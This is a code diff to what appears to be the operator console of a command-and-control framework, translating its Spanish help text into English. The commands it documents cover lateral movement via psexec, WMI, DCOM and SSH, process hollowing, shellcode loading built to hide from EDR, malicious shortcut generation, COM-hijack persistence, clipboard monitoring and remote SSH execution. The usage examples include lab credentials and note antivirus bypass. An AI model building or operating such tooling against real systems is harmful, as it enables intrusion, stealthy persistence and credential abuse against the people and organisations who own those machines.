@@ -11398,26 +11398,26 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const validMethods = ['psexec','wmi','winrm','ssh','dcom','smbexec','smb','atexec','at','runas'];
       if (!validMethods.includes(lMethod) || lp.length < 3) {
         addConsoleOutput(
-          'uso: jump <method> <host> <payload.exe> [user] [pass]\n\n' +
+          'usage: jump <method> <host> <payload.exe> [user] [pass]\n\n' +
           'Methods:\n' +
           '  psexec  — SMB admin$ + SCM service (SERVICES→agent)\n' +
-          '  smbexec — SMB + cmd.exe como servicio (SERVICES→cmd→agent, sin binario como servicio)\n' +
-          '  atexec  — MS-TSCH scheduled task runas SYSTEM, se autodestruye\n' +
+          '  smbexec — SMB + cmd.exe as service (SERVICES→cmd→agent, no binary-as-service IOC)\n' +
+          '  atexec  — MS-TSCH scheduled task runas SYSTEM, self-deletes\n' +
           '  wmi     — SMB C$ + WMI Win32_Process::Create\n' +
           '  winrm   — SMB C$ + PowerShell Invoke-Command\n' +
           '  dcom    — SMB + MMC20.Application DCOM ExecuteShellCommand\n' +
-          '  runas   — schtasks local como usuario distinto (privesc mismo host)\n' +
+          '  runas   — schtasks local as a different user (privesc same host)\n' +
           '  ssh     — SCP upload + SSH exec (Windows → Linux/Unix)\n\n' +
-          'Payload especial:\n' +
-          '  self    — reutiliza el propio exe del agente (ya en disco, sin escritura nueva → bypass AV on-write)\n\n' +
-          'Ejemplos:\n' +
+          'Special payload:\n' +
+          '  self    — reuses the agent\'s own exe on disk (already there, no new write → bypass AV on-write)\n\n' +
+          'Examples:\n' +
           '  jump psexec   10.7.10.22 agent.exe\n' +
           '  jump smbexec  10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
           '  jump atexec   10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
           '  jump wmi      10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
           '  jump dcom     10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
           '  jump ssh      192.168.1.50 implant.elf root r00tpass\n' +
-          '  jump runas    10.10.10.22 self .\\\\localuser password   (reusa binario actual)',
+          '  jump runas    10.10.10.22 self .\\\\localuser password   (reuses current binary)',
           '', null);
         return;
       }
@@ -11453,10 +11453,10 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const hp = args.trim().split(/\s+/);
       if (hp.length === 0 || hp[0] === '') {
         addConsoleOutput(
-          'uso: hollow [target.exe] <shellcode.bin>\n\n' +
-          'Inyecta shellcode en un proceso nuevo vaciando su imagen original.\n\n' +
-          'Ejemplos:\n' +
-          '  hollow shellcode.bin                       (usa RuntimeBroker.exe por defecto)\n' +
+          'usage: hollow [target.exe] <shellcode.bin>\n\n' +
+          'Injects shellcode into a new process by hollowing out its original image.\n\n' +
+          'Examples:\n' +
+          '  hollow shellcode.bin                       (uses RuntimeBroker.exe by default)\n' +
           '  hollow C:\\\\Windows\\\\System32\\\\notepad.exe shellcode.bin',
           '', null);
         return;
@@ -11480,10 +11480,10 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const payload = args.trim();
       if (!payload) {
         addConsoleOutput(
-          'uso: udrl <shellcode.bin>\n\n' +
+          'usage: udrl <shellcode.bin>\n\n' +
           'Loads shellcode into memory backed by a legitimate system DLL.\n' +
           'The memory region appears to the EDR as belonging to a real module.\n\n' +
-          'Ejemplo:\n' +
+          'Example:\n' +
           '  udrl shellcode.bin',
           '', null);
         return;
@@ -11507,9 +11507,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const gp = args.trim().split(/\s+/);
       if (gp.length < 2) {
         addConsoleOutput(
-          'uso: gen-lnk <target.exe> [cmd_args] <out.lnk>\n\n' +
-          'Genera un archivo .lnk (Windows Shell Link) que apunta a target.\n\n' +
-          'Ejemplos:\n' +
+          'usage: gen-lnk <target.exe> [cmd_args] <out.lnk>\n\n' +
+          'Generates a .lnk file (Windows Shell Link) pointing to target.\n\n' +
+          'Examples:\n' +
           '  gen-lnk C:\\\\Windows\\\\System32\\\\cmd.exe /c agent.exe C:\\\\Users\\\\Public\\\\doc.lnk\n' +
           '  gen-lnk C:\\\\Temp\\\\agent.exe "" C:\\\\Users\\\\Public\\\\report.lnk',
           '', null);
@@ -11535,9 +11535,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskArgs = JSON.stringify({clsid: cp[0], dll: cp[1], path: cp[1]});
       } else {
         addConsoleOutput(
-          'uso: com-hijack <CLSID> <dll.dll>\n     com-hijack rm <CLSID>\n\n' +
-          'Planta HKCU\\\\CLSID hijack (no requiere admin).\n\n' +
-          'CLSIDs comunes:\n' +
+          'usage: com-hijack <CLSID> <dll.dll>\n     com-hijack rm <CLSID>\n\n' +
+          'Plants HKCU\\\\CLSID hijack (no admin required).\n\n' +
+          'Common CLSIDs:\n' +
           '  {9BA05972-F6A8-11CF-A442-00A0C90A8F39}  ShellWindows (Explorer)\n' +
           '  {1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}  MruPidlList',
           '', null);
@@ -11560,7 +11560,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskType = 'CLIP_MONITOR_STOP';
         taskArgs = '';
       } else {
-        addConsoleOutput('uso: clip-monitor start [secs] | dump | stop', '', null);
+        addConsoleOutput('usage: clip-monitor start [secs] | dump | stop', '', null);
         return;
       }
       break;
@@ -11943,12 +11943,12 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskArgs = JSON.stringify({path: rp[1]});
       } else {
         addConsoleOutput(
-          'uso: reg <subcomando> ...\n\n' +
-          '  reg query  <HIVE\\Path> [ValueName]     — leer valor (o listar todos)\n' +
-          '  reg set    <HIVE\\Path> <Name> <Value>   — escribir REG_SZ\n' +
-          '  reg delete <HIVE\\Path> [ValueName]     — borrar valor o clave\n' +
-          '  reg list   <HIVE\\Path>                 — listar subclaves\n\n' +
-          'Ejemplos:\n' +
+          'usage: reg <subcommand> ...\n\n' +
+          '  reg query  <HIVE\\Path> [ValueName]     — read value (or list all)\n' +
+          '  reg set    <HIVE\\Path> <Name> <Value>   — write REG_SZ\n' +
+          '  reg delete <HIVE\\Path> [ValueName]     — delete value or key\n' +
+          '  reg list   <HIVE\\Path>                 — list sub-keys\n\n' +
+          'Examples:\n' +
           '  reg query  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion CurrentVersion\n' +
           '  reg set    HKCU\\Software\\ENDGAME beacon http://10.0.0.1:8080\n' +
           '  reg list   HKLM\\SOFTWARE',
@@ -11964,9 +11964,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const sep = args.trim().split(/\s+/);
       if (sep.length < 4) {
         addConsoleOutput(
-          'uso: ssh-exec <host> [port] <user> <pass> <cmd>\n\n' +
+          'usage: ssh-exec <host> [port] <user> <pass> <cmd>\n\n' +
           'Runs a command on a remote host via SSH (password auth).\n\n' +
-          'Ejemplos:\n' +
+          'Examples:\n' +
           '  ssh-exec 192.168.1.50 root r00tpass id\n' +
           '  ssh-exec 192.168.1.50 2222 root r00tpass whoami',
           '', null);
@@ -11978,7 +11978,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       } else {
         seUser = sep[1]; sePass = sep[2]; seCmd = sep.slice(3).join(' ');
       }
-      if (!seCmd) { addConsoleOutput('error: falta el comando a ejecutar', '', null); return; }
+      if (!seCmd) { addConsoleOutput('error: missing command to execute', '', null); return; }
       taskType = 'SSH_EXEC';
       taskArgs  = JSON.stringify({host: seHost, port: sePort, user: seUser, pass: sePass, cmd: seCmd});
       break;
